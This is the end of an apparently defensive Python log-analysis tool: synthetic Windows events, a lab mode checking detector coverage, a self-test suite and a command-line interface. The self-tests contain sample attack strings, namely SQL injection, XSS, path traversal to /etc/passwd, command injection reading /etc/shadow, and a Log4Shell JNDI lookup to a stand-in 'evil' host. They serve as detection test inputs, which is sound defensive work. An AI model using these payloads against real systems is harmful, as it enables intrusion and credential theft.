        "\tGroup Domain:\t\tBuiltin"])
    rows.append([
        (win_start + timedelta(seconds=260)).strftime("%m/%d/%Y %I:%M:%S %p"), "7045",
        "Information", "Service Control Manager", "DC01",
        "A service was installed in the system.\n\n"
        "Service Name:  WinTelemetrySvc\n"
        "Service File Name:  C:\\Windows\\Temp\\svchost32.exe -k netsvcs\n"
        "Service Type:  user mode service\nService Start Type:  auto start\n"
        "Service Account:  LocalSystem"])
    rows.append([
        (win_start + timedelta(seconds=320)).strftime("%m/%d/%Y %I:%M:%S %p"), "4740",
        "Information", "Microsoft-Windows-Security-Auditing", "DC01",
        "A user account was locked out.\n\nSubject:\n\tAccount Name:\t\tDC01$\n\n"
        "Account That Was Locked Out:\n\tAccount Name:\t\tbackup\n\n"
        "Additional Information:\n\tCaller Computer Name:\tKALI"])
    rows.append([
        (win_start + timedelta(seconds=330)).strftime("%m/%d/%Y %I:%M:%S %p"), "4740",
        "Information", "Microsoft-Windows-Security-Auditing", "DC01",
        "A user account was locked out.\n\nSubject:\n\tAccount Name:\t\tDC01$\n\n"
        "Account That Was Locked Out:\n\tAccount Name:\t\thelpdesk\n\n"
        "Additional Information:\n\tCaller Computer Name:\tKALI"])
    rows.append([
        (win_start + timedelta(seconds=400)).strftime("%m/%d/%Y %I:%M:%S %p"), "1102",
        "Information", "Microsoft-Windows-Eventlog", "DC01",
        "The audit log was cleared.\nSubject:\n\tSecurity ID:\tCORP\\svc_helper\n"
        "\tAccount Name:\tsvc_helper\n\tDomain Name:\tCORP\n\tLogon ID:\t0x3E7"])

    buffer = []
    writer = csv.writer(_StringSink(buffer), lineterminator="\n")
    for row in rows:
        writer.writerow(row)
    return "".join(buffer)


class _StringSink:
    """Minimal file-like object so csv.writer can build an in-memory string."""

    def __init__(self, sink: List[str]) -> None:
        self.sink = sink

    def write(self, text: str) -> int:
        self.sink.append(text)
        return len(text)


LAB_EXPECTED_RULES = {
    "AUTH-001": "brute force from a single source",
    "AUTH-002": "sustained attack on one account",
    "AUTH-003": "password spraying",
    "AUTH-004": "distributed attack on one account",
    "AUTH-005": "successful login after failure burst",
    "AUTH-006": "username enumeration",
    "PRIV-001": "new account created",
    "PRIV-002": "privileged group modified",
    "PRIV-004": "audit log cleared",
    "PRIV-005": "service installed",
    "PRIV-006": "account lockout",
    "SUDO-001": "repeated sudo failures",
    "SUDO-002": "high-risk sudo command",
    "TIME-001": "off-hours authentication",
    "WEB-001": "web attack signature",
    "WEB-002": "unusual HTTP method",
    "WEB-003": "client error burst",
    "WEB-004": "directory enumeration",
    "WEB-005": "scanner user agent",
    "WEB-006": "server error burst",
    "VOL-001": "traffic spike",
    "VOL-002": "source volume outlier",
    "VOL-005": "periodic beaconing",
    "EXF-001": "large single transfer",
    "EXF-002": "high cumulative transfer",
}


def write_lab_corpus(directory: str) -> List[str]:
    os.makedirs(directory, exist_ok=True)
    base = _lab_base_time()
    files = {
        "lab_access.log": generate_lab_access_log(base),
        "lab_auth.log": generate_lab_auth_log(base),
        "lab_winevent.csv": generate_lab_winevent_csv(base),
    }
    written: List[str] = []
    for name, content in files.items():
        path = os.path.join(directory, name)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(content)
        written.append(path)
    return written


def run_lab(args: argparse.Namespace, cfg: Config) -> int:
    """Generate the corpus, run the pipeline, then verify detector coverage."""
    directory = args.lab_dir or os.path.join(os.getcwd(), "log_parser_lab")
    print(banner(hr("=")))
    print(banner(f" {TOOL_NAME} LAB MODE - self-contained detection demonstration"))
    print(banner(hr("=")))
    info(f"writing sample corpus to {directory}")
    files = write_lab_corpus(directory)
    for path in files:
        size = os.path.getsize(path)
        lines = sum(1 for _ in open(path, "r", encoding="utf-8"))
        good(f"{os.path.basename(path):<20} {lines:>5} lines  {human_bytes(size)}")
    print()

    ingestor = LogIngestor(cfg, forced_format="auto")
    events = ingestor.ingest(files)
    good(f"normalized {len(events):,} events from {ingestor.stats.total_lines:,} lines "
         f"({ingestor.stats.parse_rate:.1f}% clean parse rate)")

    engine = AnalysisEngine(cfg)
    result = engine.run(events, ingestor.stats, files)

    ConsoleReporter(result, cfg, args.min_severity).render()

    # ---- detector coverage verification ------------------------------------
    print(banner(hr("-")))
    print(banner(" DETECTOR VERIFICATION MATRIX"))
    print(banner(hr("-")))
    fired = {a.rule_id for a in result.alerts}
    passed = 0
    for rule_id in sorted(LAB_EXPECTED_RULES):
        hit = rule_id in fired
        passed += 1 if hit else 0
        mark = f"{C.BGREEN}PASS{C.RESET}" if hit else f"{C.BRED}MISS{C.RESET}"
        print(f"  [{mark}] {rule_id:<10} {LAB_EXPECTED_RULES[rule_id]}")
    extra = fired - set(LAB_EXPECTED_RULES)
    if extra:
        print(f"\n  {C.CYAN}additional rules fired:{C.RESET} {', '.join(sorted(extra))}")
    total = len(LAB_EXPECTED_RULES)
    print()
    if passed == total:
        good(f"detector coverage: {passed}/{total} expected rules fired")
    else:
        warn(f"detector coverage: {passed}/{total} expected rules fired")

    written = emit_reports(result, cfg, args, default_dir=directory)
    for path in written:
        good(f"report written: {path}")
    return 0 if passed == total else 1


# ===========================================================================
# SECTION 18 - SELF TEST
# ===========================================================================
class _TestRunner:
    """Very small assertion harness so --selftest needs no test framework."""

    def __init__(self) -> None:
        self.passed = 0
        self.failed = 0
        self.failures: List[str] = []

    def check(self, label: str, condition: bool, detail: str = "") -> None:
        if condition:
            self.passed += 1
            print(f"  [{C.BGREEN}PASS{C.RESET}] {label}")
        else:
            self.failed += 1
            self.failures.append(f"{label} {detail}".strip())
            print(f"  [{C.BRED}FAIL{C.RESET}] {label} {C.DIM}{detail}{C.RESET}")

    def equal(self, label: str, actual: Any, expected: Any) -> None:
        self.check(label, actual == expected, f"(got {actual!r}, expected {expected!r})")


def run_selftest() -> int:
    cfg = Config()
    t = _TestRunner()
    print(banner(hr("=")))
    print(banner(f" {TOOL_NAME} SELF TEST"))
    print(banner(hr("=")))

    # ---- timestamp parsing -------------------------------------------------
    print(f"\n{C.BOLD}Timestamp parsing{C.RESET}")
    stamp = parse_apache_timestamp("10/Oct/2023:13:55:36 -0500")
    t.equal("Apache timestamp", stamp, datetime(2023, 10, 10, 13, 55, 36))
    t.check("Apache timestamp rejects garbage", parse_apache_timestamp("not a date") is None)
    t.equal("ISO 8601 timestamp", parse_iso_timestamp("2024-03-05T22:14:07Z"),
            datetime(2024, 3, 5, 22, 14, 7))
    t.equal("Windows US-culture timestamp",
            parse_windows_timestamp("3/5/2024 10:14:07 PM"), datetime(2024, 3, 5, 22, 14, 7))
    t.equal("Windows 12 AM handling",
            parse_windows_timestamp("3/5/2024 12:30:00 AM"), datetime(2024, 3, 5, 0, 30, 0))
    t.equal("Syslog timestamp (year supplied)",
            parse_syslog_timestamp("Feb", "9", "04", "05", "06", 2023),
            datetime(2023, 2, 9, 4, 5, 6))

    # ---- IP handling -------------------------------------------------------
    print(f"\n{C.BOLD}Address normalization{C.RESET}")
    t.equal("strip port from IPv4", clean_ip("10.0.0.5:54221"), "10.0.0.5")
    t.equal("strip brackets/port from IPv6", clean_ip("[2001:db8::1]:443"), "2001:db8::1")
    t.equal("IPv4-mapped IPv6", clean_ip("::ffff:192.0.2.9"), "192.0.2.9")
    t.equal("X-Forwarded-For first hop", clean_ip("203.0.113.9, 10.0.0.1"), "203.0.113.9")
    t.equal("placeholder rejected", clean_ip("-"), None)
    t.equal("garbage rejected", clean_ip("not-an-ip"), None)
    t.equal("classify private", ip_kind("10.1.2.3"), "private")
    t.equal("classify public", ip_kind("8.8.8.8"), "public")
    t.equal("classify loopback", ip_kind("127.0.0.1"), "loopback")

    # ---- access log parser -------------------------------------------------
    print(f"\n{C.BOLD}Apache/Nginx access log parser{C.RESET}")
    parser = AccessLogParser(cfg)
    line = ('192.0.2.10 - frank [10/Oct/2023:13:55:36 -0500] "GET /apache_pb.gif HTTP/1.0" '
            '200 2326 "http://example.com/start.html" "Mozilla/5.0"')
    ev = parser.parse(line, 1, "test.log")
    t.check("combined format parsed", ev is not None)
    if ev:
        t.equal("  source IP", ev.src_ip, "192.0.2.10")
        t.equal("  auth user", ev.user, "frank")
        t.equal("  method", ev.method, "GET")
        t.equal("  URI", ev.uri, "/apache_pb.gif")
        t.equal("  status", ev.status, 200)
        t.equal("  size", ev.size, 2326)
        t.equal("  user agent", ev.user_agent, "Mozilla/5.0")
        t.equal("  outcome", ev.outcome, "success")
    common = parser.parse('192.0.2.11 - - [10/Oct/2023:13:55:40 -0500] '
                          '"POST /login HTTP/1.1" 401 -', 2, "test.log")
    t.check("common format (no referrer/agent) parsed", common is not None)
    if common:
        t.equal("  status 401", common.status, 401)
        t.equal("  missing size becomes 0", common.size, 0)
        t.equal("  outcome failure", common.outcome, "failure")
    encoded = parser.parse('198.51.100.1 - - [10/Oct/2023:14:00:00 -0500] '
                           '"GET /a?x=%252e%252e%252fetc%252fpasswd HTTP/1.1" 404 0 "-" "-"',
                           3, "test.log")
    t.check("double URL-decoding applied",
            bool(encoded and "../etc/passwd" in (encoded.uri_decoded or "")),
            f"(decoded={encoded.uri_decoded if encoded else None})")

    # ---- syslog parser -----------------------------------------------------
    print(f"\n{C.BOLD}Syslog parser and auth classification{C.RESET}")
    syslog = SyslogParser(cfg, reference_year=2023)
    fail = syslog.parse("Oct 10 13:55:36 web01 sshd[1234]: Failed password for admin "
                        "from 198.51.100.23 port 41022 ssh2", 1, "auth.log")
    t.check("sshd failure parsed", fail is not None)
    if fail:
        t.equal("  action", fail.action, "login_failure")
        t.equal("  user", fail.user, "admin")
        t.equal("  source", fail.src_ip, "198.51.100.23")
        t.equal("  category", fail.category, "auth")
    ok = syslog.parse("Oct 10 13:56:01 web01 sshd[1234]: Accepted password for admin "
                      "from 198.51.100.23 port 41099 ssh2", 2, "auth.log")
    t.equal("sshd success action", ok.action if ok else None, "login_success")
    invalid = syslog.parse("Oct 10 13:57:00 web01 sshd[1300]: Invalid user oracle "
                           "from 203.0.113.9 port 5000", 3, "auth.log")
    t.check("invalid user flagged", bool(invalid and invalid.extra.get("invalid_user")))
    sudo = syslog.parse("Oct 10 14:00:00 web01 sudo: pam_unix(sudo:auth): authentication "
                        "failure; logname=webdev uid=1001 euid=0 tty=/dev/pts/2 "
                        "ruser=webdev rhost=  user=webdev", 4, "auth.log")
    t.equal("sudo failure not misfiled as login", sudo.action if sudo else None, "sudo_failure")
    cmd = syslog.parse("Oct 10 14:01:00 web01 sudo:  webdev : TTY=pts/2 ; PWD=/home/webdev ; "
                       "USER=root ; COMMAND=/bin/bash", 5, "auth.log")
    t.equal("sudo command captured", cmd.action if cmd else None, "sudo_command")
    rfc5424 = syslog.parse("<34>1 2023-10-11T22:14:15Z web01 sshd 1234 ID47 - "
                           "Failed password for root from 192.0.2.5 port 22 ssh2",
                           6, "auth.log")
    t.check("RFC 5424 envelope parsed",
            bool(rfc5424 and rfc5424.timestamp == datetime(2023, 10, 11, 22, 14, 15)))
    t.equal("RFC 5424 auth classification",
            rfc5424.action if rfc5424 else None, "login_failure")

    # ---- Windows event parser ---------------------------------------------
    print(f"\n{C.BOLD}Windows Event Log parser{C.RESET}")
    win = WindowsEventParser(cfg)
    record = {
        "TimeCreated": "3/5/2024 10:14:07 PM", "Id": "4625",
        "ProviderName": "Microsoft-Windows-Security-Auditing", "MachineName": "DC01",
        "Message": ("An account failed to log on.\n\nSubject:\n\tAccount Name:\t\t-\n\n"
                    "Logon Type:\t\t3\n\nAccount For Which Logon Failed:\n"
                    "\tAccount Name:\t\tadministrator\n\n"
                    "Network Information:\n\tSource Network Address:\t203.0.113.44"),
    }
    wev = win.parse_record(record, 2, "ev.csv")
    t.check("4625 record parsed", wev is not None)
    if wev:
        t.equal("  event id", wev.event_id, 4625)
        t.equal("  action", wev.action, "login_failure")
        t.equal("  target account", wev.user, "administrator")
        t.equal("  source address", wev.src_ip, "203.0.113.44")
        t.equal("  logon type", wev.logon_type, "3")

    # ---- attack signatures -------------------------------------------------
    print(f"\n{C.BOLD}Attack signature matching{C.RESET}")
    def matches(text: str) -> Set[str]:
        return {name for name, pattern, _s, _m in WEB_ATTACK_SIGNATURES if pattern.search(text)}

    t.check("UNION SELECT detected",
            "SQL Injection - UNION SELECT" in matches("/p?id=1 UNION SELECT user,pass FROM x"))
    t.check("tautology detected",
            "SQL Injection - tautology" in matches("/s?q=' OR '1'='1"))
    t.check("time-based blind detected",
            "SQL Injection - time-based blind" in matches("/r?y=1 AND SLEEP(5)"))
    t.check("script tag XSS detected",
            "Cross-Site Scripting - script tag" in matches("/s?q=<script>alert(1)</script>"))
    t.check("path traversal detected",
            "Path Traversal" in matches("/f?p=../../../../etc/passwd"))
    t.check("command injection detected",
            "Command Injection" in matches("/x?h=127.0.0.1;cat /etc/shadow"))
    t.check("Log4Shell detected",
            "Log4Shell / JNDI lookup" in matches("/${jndi:ldap://evil/a}"))
    t.check("benign request produces no signature hits",
            not matches("/products?category=shoes&page=2&sort=price"))
    t.check("sqlmap agent flagged",
            any(p.search("sqlmap/1.7.11#stable") for _l, p, _s in SUSPICIOUS_AGENTS))

    # ---- threshold primitives ---------------------------------------------
    print(f"\n{C.BOLD}Sliding window and statistics{C.RESET}")
    window = SlidingWindow(window_seconds=60, threshold=3)
    base = datetime(2024, 1, 1, 12, 0, 0)

    def make(offset: int) -> Event:
        ev = Event(raw=f"evt{offset}", line_no=offset, source_file="x", source_type="t")
        ev.timestamp = base + timedelta(seconds=offset)
        ev.order_key = ev.timestamp.timestamp()
        return ev

    fired = [window.add("k", make(o)) for o in (0, 10, 20)]
    t.check("threshold crossed on third event in window", fired == [False, False, True])
    window2 = SlidingWindow(window_seconds=60, threshold=3)
    spread = [window2.add("k", make(o)) for o in (0, 100, 200)]
    t.check("events outside the window do not accumulate", spread == [False, False, False])

    distinct = DistinctWindow(window_seconds=300, threshold=3)
    hits = [distinct.add("ip", user, make(i * 10))
            for i, user in enumerate(["a", "a", "b", "c"])]
    t.check("distinct-value threshold ignores repeats", hits == [False, False, False, True])

    baseline = [5, 6, 4, 7, 5, 6, 200]
    med, mad = median_abs_deviation(baseline)
    mean = statistics.mean(baseline)
    stdev = statistics.pstdev(baseline)
    t.check("MAD resists the outlier it is measuring", mad <= 2.0, f"(mad={mad})")
    t.check("outlier scores far above threshold",
            robust_zscore(200, med, mad) > 10,
            f"(z={robust_zscore(200, med, mad):.1f})")
    # The point of using MAD at all: the classic mean/stdev z-score assigns the
    # same outlier a score of roughly 2.4 because the outlier inflated both the
    # mean and the standard deviation, so a 3-sigma rule would miss it entirely.
    t.check("mean/stdev z-score would have missed the same outlier",
            (200 - mean) / stdev < 3.0, f"(classic z={(200 - mean) / stdev:.2f})")
    t.equal("degenerate MAD returns zero score", robust_zscore(10, 5, 0), 0.0)

    # ---- end-to-end --------------------------------------------------------
    print(f"\n{C.BOLD}End-to-end pipeline{C.RESET}")
    tmpdir = tempfile.mkdtemp(prefix="log_parser_selftest_")
    try:
        files = write_lab_corpus(tmpdir)
        ingestor = LogIngestor(Config(), forced_format="auto")
        events = ingestor.ingest(files)
        t.check("corpus produced events", len(events) > 300, f"(got {len(events)})")
        t.check("parse rate acceptable", ingestor.stats.parse_rate > 90,
                f"({ingestor.stats.parse_rate:.1f}%)")
        result = AnalysisEngine(Config()).run(events, ingestor.stats, files)
        fired_rules = {a.rule_id for a in result.alerts}
        missing = sorted(set(LAB_EXPECTED_RULES) - fired_rules)
        t.check("every expected detector fired", not missing, f"(missing: {missing})")
        t.check("risk score reflects critical findings", result.risk_score >= 85,
                f"(score={result.risk_score})")
        markdown = MarkdownReporter(result, Config()).render()
        t.check("markdown report generated", len(markdown) > 4000, f"({len(markdown)} chars)")
        payload = json.loads(JsonReporter(result, Config()).render())
        t.check("JSON report is valid and populated",
                payload["summary"]["total_findings"] == len(result.alerts))
        html = HtmlReporter(result, Config()).render()
        t.check("HTML report generated", html.strip().endswith("</html>"))
    finally:
        for name in os.listdir(tmpdir):
            try:
                os.remove(os.path.join(tmpdir, name))
            except OSError:
                pass
        try:
            os.rmdir(tmpdir)
        except OSError:
            pass

    print()
    print(banner(hr("=")))
    if t.failed == 0:
        good(f"ALL TESTS PASSED  ({t.passed} assertions)")
    else:
        error(f"{t.failed} FAILED, {t.passed} passed")
        for failure in t.failures:
            print(f"    - {failure}")
    print(banner(hr("=")))
    return 0 if t.failed == 0 else 1


# ===========================================================================
# SECTION 19 - REPORT EMISSION
# ===========================================================================
def emit_reports(result: AnalysisResult, cfg: Config, args: argparse.Namespace,
                 default_dir: Optional[str] = None) -> List[str]:
    out_dir = args.out_dir or default_dir or os.path.join(os.getcwd(), "log_parser_report")
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    written: List[str] = []

    if args.markdown or not (args.json_out or args.csv_out or args.html):
        path = args.markdown if isinstance(args.markdown, str) else \
            os.path.join(out_dir, f"security_report_{stamp}.md")
        write_text(path, MarkdownReporter(result, cfg, args.analyst).render())
        written.append(path)
    if args.json_out:
        path = args.json_out if isinstance(args.json_out, str) else \
            os.path.join(out_dir, f"findings_{stamp}.json")
        write_text(path, JsonReporter(result, cfg).render())
        written.append(path)
    if args.csv_out:
        path = args.csv_out if isinstance(args.csv_out, str) else \
            os.path.join(out_dir, f"alerts_{stamp}.csv")
        os.makedirs(os.path.dirname(os.path.abspath(path)) or ".", exist_ok=True)
        CsvReporter(result).write(path)
        written.append(path)
    if args.html:
        path = args.html if isinstance(args.html, str) else \
            os.path.join(out_dir, f"security_report_{stamp}.html")
        write_text(path, HtmlReporter(result, cfg, args.analyst).render())
        written.append(path)
    return written


# ===========================================================================
# SECTION 20 - COMMAND LINE INTERFACE
# ===========================================================================
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="log_parser.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{TOOL_NAME} v{TOOL_VERSION} - security log parser and anomaly detector",
        epilog="""
examples:
  py log_parser.py --lab
        Generate a sample corpus with planted attacks, analyze it, and verify
        that every detector fires.  Requires no external data.

  py log_parser.py --selftest
        Run the parser, regex and threshold unit tests.

  py log_parser.py -i /var/log/auth.log -i /var/log/nginx/access.log
        Analyze two files, auto-detecting the format of each.

  py log_parser.py -i "C:\\inetpub\\logs\\*.log" --html --json-out
        Analyze a glob of IIS/Apache logs and emit HTML plus JSON.

  py log_parser.py -i events.csv --format winevent_csv --min-severity HIGH
        Analyze a Windows Event Log export, printing only HIGH and above.

  py log_parser.py -i auth.log --fail-threshold 3 --fail-window 120 \\
                  --allow-ip 10.0.0.0/8 --allow-user backupsvc
        Tighten the brute-force rule while suppressing known-good sources.
""")
    src = parser.add_argument_group("input")
    src.add_argument("-i", "--input", action="append", default=[], metavar="PATH",
                     help="log file, directory or glob pattern (repeatable)")
    src.add_argument("--format", default="auto",
                     choices=["auto", "access", "apache_error", "nginx_error", "syslog",
                              "winevent_csv", "winevent_json", "generic"],
                     help="force an input format instead of auto-detecting (default: auto)")
    src.add_argument("--config", metavar="FILE", help="JSON file of threshold overrides")
    src.add_argument("--baseline", metavar="FILE",
                     help="text file of known-good IP addresses, one per line")

    out = parser.add_argument_group("output")
    out.add_argument("--out-dir", metavar="DIR", help="directory for report files")
    out.add_argument("--markdown", nargs="?", const=True, default=False, metavar="FILE",
                     help="write the Markdown security report (default output)")
    out.add_argument("--json-out", nargs="?", const=True, default=False, metavar="FILE",
                     help="write machine-readable JSON findings")
    out.add_argument("--csv-out", nargs="?", const=True, default=False, metavar="FILE",
                     help="write a flat CSV alert table")
    out.add_argument("--html", nargs="?", const=True, default=False, metavar="FILE",
                     help="write a styled standalone HTML report")
    out.add_argument("--min-severity", default="INFO", choices=list(SEVERITIES),
                     help="minimum severity printed to the console (default: INFO)")
    out.add_argument("--analyst", default="", help="analyst name recorded in the report")
    out.add_argument("--top", type=int, default=None, metavar="N",
                     help="rows shown in top-N statistics tables")
    out.add_argument("--quiet", action="store_true", help="suppress the console report")
    out.add_argument("--no-color", action="store_true", help="disable ANSI colour output")
    out.add_argument("-v", "--verbose", action="store_true", help="verbose diagnostics")

    thr = parser.add_argument_group("detection thresholds")
    thr.add_argument("--fail-threshold", type=int, metavar="N",
                     help="failed logins from one source that trigger AUTH-001")
    thr.add_argument("--fail-window", type=int, metavar="SEC",
                     help="sliding window for failed-login counting")
    thr.add_argument("--spray-users", type=int, metavar="N",
                     help="distinct accounts from one source that trigger AUTH-003")
    thr.add_argument("--http-error-threshold", type=int, metavar="N",
                     help="4xx responses per window that trigger WEB-003")
    thr.add_argument("--enum-threshold", type=int, metavar="N",
                     help="distinct 404 paths that trigger WEB-004")
    thr.add_argument("--spike-sigma", type=float, metavar="Z",
                     help="modified z-score cut-off for traffic spikes")
    thr.add_argument("--spike-bucket", type=int, metavar="SEC",
                     help="histogram bucket size for spike detection")
    thr.add_argument("--exfil-bytes", type=int, metavar="BYTES",
                     help="single-response size that triggers EXF-001")
    thr.add_argument("--business-hours", metavar="START-END",
                     help="business hours for the off-hours rule, e.g. 8-18")
    thr.add_argument("--allow-ip", action="append", default=[], metavar="IP|CIDR",
                     help="suppress findings for this source (repeatable)")
    thr.add_argument("--allow-user", action="append", default=[], metavar="USER",
                     help="suppress findings for this account (repeatable)")

    mode = parser.add_argument_group("modes")
    mode.add_argument("--lab", action="store_true",
                      help="generate sample logs with planted attacks and analyze them")
    mode.add_argument("--lab-dir", metavar="DIR", help="where --lab writes its corpus")
    mode.add_argument("--selftest", action="store_true",
                      help="run parser, regex and threshold unit tests")
    mode.add_argument("--version", action="version",
                      version=f"{TOOL_NAME} {TOOL_VERSION}")
    return parser


def apply_cli_overrides(cfg: Config, args: argparse.Namespace) -> None:
    mapping = {
        "fail_threshold": args.fail_threshold,
        "fail_window": args.fail_window,
        "spray_users": args.spray_users,
        "http_error_threshold": args.http_error_threshold,
        "enum_404_threshold": args.enum_threshold,
        "spike_sigma": args.spike_sigma,
        "spike_bucket": args.spike_bucket,
        "exfil_single_bytes": args.exfil_bytes,
        "top_n": args.top,
    }
    for key, value in mapping.items():
        if value is not None:
            setattr(cfg, key, value)
    if args.business_hours:
        match = re.match(r'^(\d{1,2})\s*-\s*(\d{1,2})$', args.business_hours.strip())
        if match:
            cfg.business_start_hour = int(match.group(1))
            cfg.business_end_hour = int(match.group(2))
        else:
            warn(f"--business-hours '{args.business_hours}' not understood, using default")
    cfg.allow_ips.extend(args.allow_ip)
    cfg.allow_users.extend(args.allow_user)
    if args.baseline:
        try:
            with open(args.baseline, "r", encoding="utf-8-sig") as fh:
                for line in fh:
                    ip = clean_ip(line.strip().split("#")[0])
                    if ip:
                        cfg.baseline_ips.add(ip)
            info(f"loaded {len(cfg.baseline_ips)} baseline address(es)")
        except OSError as exc:
            warn(f"could not read baseline file: {exc}")


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    init_terminal(args.no_color)
    set_verbose(args.verbose)

    cfg = Config()
    if args.config:
        try:
            cfg.load_json(args.config)
            info(f"loaded threshold overrides from {args.config}")
        except (OSError, ValueError, json.JSONDecodeError) as exc:
            error(f"could not load config: {exc}")
            return 2
    apply_cli_overrides(cfg, args)

    if args.selftest:
        return run_selftest()
    if args.lab:
        return run_lab(args, cfg)

    if not args.input:
        parser.print_help()
        print()
        error("no input specified - use -i PATH, or try --lab for a demonstration")
        return 2

    files = expand_inputs(args.input)
    if not files:
        error("no readable log files matched the supplied input patterns")
        return 2

    print(banner(hr("=")))
    print(banner(f" {TOOL_NAME} v{TOOL_VERSION} - analyzing {len(files)} file(s)"))
    print(banner(hr("=")))

    ingestor = LogIngestor(cfg, forced_format=args.format)
    events = ingestor.ingest(files)
    if not events:
        error("no events could be extracted from the supplied files")
        return 2
    good(f"normalized {len(events):,} events "
         f"({ingestor.stats.parse_rate:.1f}% clean parse rate)")

    result = AnalysisEngine(cfg).run(events, ingestor.stats, files)

    if not args.quiet:
        ConsoleReporter(result, cfg, args.min_severity).render()

    for path in emit_reports(result, cfg, args):
        good(f"report written: {path}")

    # Exit status is scriptable: 0 = clean, 1 = findings at or above the
    # requested severity, 2 = the run itself failed.
    threshold_rank = SEVERITY_RANK.get(args.min_severity, 0)
    return 1 if any(a.rank >= threshold_rank for a in result.alerts) else 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        error("interrupted by user")
        sys.exit(130)
    except BrokenPipeError:
        # Occurs when output is piped into a command that exits early (| head).
        try:
            sys.stdout.close()
        except Exception:
            pass
        sys.exit(0)
